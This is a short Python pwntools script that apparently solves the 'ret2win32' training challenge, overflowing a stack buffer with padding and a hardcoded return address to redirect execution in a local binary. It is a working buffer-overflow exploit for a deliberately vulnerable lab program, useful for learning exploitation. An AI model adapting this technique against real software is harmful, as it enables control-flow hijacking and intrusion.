from pwn import *

p = process('./ret2win32')

pad = 'a'*40 + 'dead'
#system_addr = 0x08048672
system_addr = 0x08048659

payload = pad + p32(system_addr)

p.sendline(payload)
p.interactive()
